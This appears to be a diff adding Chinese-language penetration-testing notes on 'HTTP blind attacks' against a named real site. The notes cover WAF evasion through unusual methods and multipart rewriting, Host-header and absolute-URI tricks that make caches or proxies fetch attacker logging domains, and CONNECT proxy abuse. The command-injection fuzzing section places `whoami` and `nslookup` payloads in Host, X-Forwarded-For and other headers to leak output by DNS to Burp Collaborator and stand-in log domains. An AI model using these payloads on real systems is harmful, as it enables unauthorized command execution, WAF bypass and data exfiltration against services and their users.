@@ -1,0 +1,289 @@
+HTTP盲攻击手段
+
+遇见云WAF被拦截，一般来说云WAF会有自动纠错功能。当你发送正常请求的数据包会被拦截，但是如果发送一个不正常的数据包会怎么样？
+云WAF：云端WAF，当购买了厂商的云WAF功能。当请求你的域名的时候，会先经过远端的WAF服务器
+
+如果云WAF只配置了GET和POST的策略，那么其他不认识的请求就会出现问题了
+
+GET /test?id=123 HTTP/1.1  -> LOL /test?id=123 HTTP/1.1 （当然可以尝试其他字符串）
+Host: sina.cn
+Connection: close
+Cache-Control: max-age=0
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like
+Gecko) Chrome/60.0.3112.113 Safari/537.36
+Accept:
+text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Referer: https://sina.cn/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en,en-CA;q=0.8,be;q=0.6,zh-CN;q=0.4,zh;q=0.2
+Cookie: a=b
+
+对付POST请求的话可以将其变成文件上传，虽然可能不接受上传，但是会接受参数，那么就有几率绕过WAF了
+正常请求：
+POST /test HTTP/1.1
+Host: sina.cn
+Connection: close
+Cache-Control: max-age=0
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like
+Gecko) Chrome/60.0.3112.113 Safari/537.36
+Accept:
+text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Referer: https://sina.cn/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en,en-CA;q=0.8,be;q=0.6,zh-CN;q=0.4,zh;q=0.2
+Cookie: a=b
+c=d 
+
+
+不正常请求：
+POST /test.php HTTP/1.1
+Host: target.com
+Content-Length: 297
+Pragma: no-cache
+Cache-Control: no-cache
+Content-Type: multipart/form-data; boundary=--------1004104974
+…
+Cookie: a=b
+Connection: close
+----------1004104974
+Content-Disposition: form-data; name="file"; filename=""
+Content-Type: application/octet-stream
+----------1004104974
+Content-Disposition: form-data; name="c"
+
+d
+----------1004104974
+Content-Disposition: form-data; name="submit"
+Submit
+----------1004104974--
+
+
+在绕过WAF的时候可以尝试修改请求头或者某个参数的大小写或值，或者添加某些值，看看WAF是怎么判断的
+
+
+脚本盲攻击检测方法：
+PS：不要发送恶意的payload，如果WAF封你IP的话这个IP就废掉了
+可以发送正常的请求方式和不正常的请求方式来测试，像上面的LOL
+
+脚本检测方式：
+1>变更请求方式，对比返回差异
+*2>发送Payload触发Waf拦截，对比变更请求方法前后的差异
+判据：
+1> 返回内容不属于黑名单内容
+2> 返回内容在变更方法前后保持一致
+黑名单：（有些WAf会拒绝其请求，返回403或405状态码）
+设置返回黑名单，如403、405或特征字符串
+
+修复上方说的思路操作：
+就算不算正常的请求，也让其走WAF的检测流程，或者拒绝其请求，返回403或405状态码
+
+
+攻击没有思路：
+解决：变更HTTP请求URI，目标处理产生异常，分析异常找到攻击思路
+目标：触发异常，分析攻击思路
+
+如视频里面说的，将请求一个路径的url改为其他域名，并且前面不带/会怎么样
+GET /test HTTP/1.1 -> GET test.randkey.yourloggingdomain.com HTTP/1.1
+Host: sina.cn
+Connection: close
+Cache-Control: max-age=0
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like
+Gecko) Chrome/60.0.3112.113 Safari/537.36
+Accept:
+text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Referer: https://sina.cn/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en,en-CA;q=0.8,be;q=0.6,zh-CN;q=0.4,zh;q=0.2
+Cookie: a=b
+
+常见返回的状态码是：400,405,302（因为不接受）
+
+那为什么会存在漏洞呢？
+如果将请求发送到目标之前，会经过某些流量分析系统。中间可能会出现错误
+
+GET /test HTTP/1.1 -> GET @test.randkey.yourloggingdomain.com HTTP/1.1
+Host: sina.cn
+Connection: close
+Cache-Control: max-age=0
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like
+Gecko) Chrome/60.0.3112.113 Safari/537.36
+Accept:
+text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Referer: https://sina.cn/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en,en-CA;q=0.8,be;q=0.6,zh-CN;q=0.4,zh;q=0.2
+Cookie: a=b
+
+
+GET /test HTTP/1.1 -> GET http://test.randkey.yourloggingdomain.com HTTP/1.1
+Host: sina.cn
+Connection: close
+Cache-Control: max-age=0
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like
+Gecko) Chrome/60.0.3112.113 Safari/537.36
+Accept:
+text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Referer: https://sina.cn/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en,en-CA;q=0.8,be;q=0.6,zh-CN;q=0.4,zh;q=0.2
+Cookie: a=b
+
+针对缓存系统的盲攻击：
+由于某些公司内网网络带宽不够或其他原因，在公司内部架设了一个缓存服务器，这个缓存服务器是没有任何问题的，他会缓存一些东西
+但是如果你将HOST头修改成你自己的站点，然后看log日志之后发现了缓存服务器的确请求了，那么该怎么利用呢？
+
+
+修改Host到你自己的站点:
+GET /test HTTP/1.1
+Host: sina.cn  sina.cn@test.randkey.yourloggingdomain.com
+Connection: close
+Cache-Control: max-age=0
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like
+Gecko) Chrome/60.0.3112.113 Safari/537.36
+Accept:
+text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Referer: https://sina.cn/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en,en-CA;q=0.8,be;q=0.6,zh-CN;q=0.4,zh;q=0.2
+Cookie: a=b
+
+在你的页面设恶意js：
+HTTP/1.1 200 OK
+Content-Type: text/html;charset=utf-8
+<html>
+.....
+<img src="http://test.randkey1.yourloggingdomain.com/randkey2.jpg">
+.....
+</html>
+
+响应可能如下：
+From xss to internal sensitive information leak
+[Step1]Attack Request: (Request to 123.123.123.123)
+POST /xss.cgi HTTP/1.1
+ContentLength: 62
+Connection: close
+xss=<img src="http://internalserver.com/index.php/fake.jpg"/>
+[Step2]Caching Request:(Request to 10.10.1.12)
+GET /index.php/fake.jpg
+Host: internalserver.com (internalserver.com 10.10.1.12)
+Connection: close
+[Step3]Attack Request: (Request to 123.123.123.123)
+GET /index.php/fake.jpg
+Host: internalserver.com
+Connection: close
+Now you get index.php Sensitive Information Leak （不存在漏洞）
+
+
+使用脚本检测的思路：
+脚本检测方式：
+1>分别发送xss payload，带入dnslog域名和httplog1域名
+2>http域名内返回的网页内容，嵌入httplog2域名并返回图片
+判据：
+1> dnslog或httplog1被触发，说明页面会被分析
+2> httplog2触发，说明httplog1返回的内容会被解析，很有可能存在一个可以利用的cache系
+统
+
+模糊测试命令注入：
+所有正常存在主机名解析的地方
+所有存在漏洞导致主机名解析的地方
+所有能插入东西的地方
+所有本来没有东西的地方
+所有地方…
+
+GET /test HTTP/1.1
+Host: sina.cn  sina.cn@test.randkey.yourloggingdomain.com
+Connection: close
+Cache-Control: max-age=0
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like
+Gecko) Chrome/60.0.3112.113 Safari/537.36
+Accept:
+text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Referer: https://sina.cn/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en,en-CA;q=0.8,be;q=0.6,zh-CN;q=0.4,zh;q=0.2
+Cookie: a=b
+
+GET /test HTTP/1.1
+Host: sina.cn  sina.cn.test.randkey.yourloggingdomain.com
+Connection: close
+Cache-Control: max-age=0
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like
+Gecko) Chrome/60.0.3112.113 Safari/537.36
+Accept:
+text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Referer: https://sina.cn/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en,en-CA;q=0.8,be;q=0.6,zh-CN;q=0.4,zh;q=0.2
+Cookie: a=b
+
+GET /test HTTP/1.1
+Host: sina.cn  sina.cn.`whoami`.test.randkey.yourloggingdomain.com
+Connection: close
+Cache-Control: max-age=0
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like
+Gecko) Chrome/60.0.3112.113 Safari/537.36
+Accept:
+text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Referer: https://sina.cn/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en,en-CA;q=0.8,be;q=0.6,zh-CN;q=0.4,zh;q=0.2
+Cookie: a=b
+
+GET /test HTTP/1.1
+Host: sina.cn 
+sina.cn.`nslookup randkey2.yourloggingdomain.com`.test.randkey.yourloggingdomain.com
+Connection: close
+Cache-Control: max-age=0
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like
+Gecko) Chrome/60.0.3112.113 Safari/537.36
+Accept:
+text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Referer: https://sina.cn/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en,en-CA;q=0.8,be;q=0.6,zh-CN;q=0.4,zh;q=0.2
+Cookie: a=b
+
+GET / HTTP/1.1
+Host: sina.cn  `whoami`.randkey.youlogdomain.com
+Connection: close
+Cache-Control: no-transform
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87
+Safari/537.36 root@randkey.youlogdomain.com
+Cookie: a=b
+True-Client-IP: `whoami`.randkey.youlogdomain.com
+Forwarded:
+for=`whoami`.gg0qyju6tkxhwh1nyc6pazh6mxs1gq.burpcollaborator.net;by=`whoami`.gg0qyju6tkxhwh1nyc6pazh6m
+xs1gq.burpcollaborator.net;host=`whoami`randkey.youlogdomain.com
+From: root@randkey.youlogdomain.com
+X-Real-IP: `whoami`.randkey.youlogdomain.com
+X-Wap-Profile: http://randkey.youlogdomain.com/wap.xml
+Client-IP: `whoami`.randkey.youlogdomain.com
+Referer: http://randkey.youlogdomain.com/ref
+X-Forwarded-For: `whoami`.randkey.youlogdomain.com
+Contact: root@randkey.youlogdomain.com
+X-Client-IP: `whoami`.randkey.youlogdomain.com
+X-Originating-IP: `whoami`.randkey.youlogdomain.com
+Proxy:`whoami`.randkey.youlogdomain.com
+
+HTTP参数污染攻击
+在没有接收相应参数的地方增加参数或变更参数（参数污染）
+1>隐藏的方法、接口或可选参数
+2>数据自动绑定覆盖
+目标：
+1>调用私有接口或方法，或传入可选参数改变程序行为
+2>覆盖用户数据，导致数据非法或进行精准数据操纵
+参数来源：返回包参数或目标站点所有参数或常见参数
+
+
+服务器代理配置不当导致从外到内日穿
+如果服务器设置了代理而且代理没对，协议进行过滤，那么攻击者可以使用CONNECT协议进行TCP连接
+CONNECT sina.cn:80 HTTP/1.1
+Host: sina.cn
+Proxy-Connection: keep-alive
+支持HTTPS代理方式进行TCP连接
+发送一个正常POST请求头，然后后面跟上其他协议
+REDIS/Memcache…
+Struts2
+
+
+
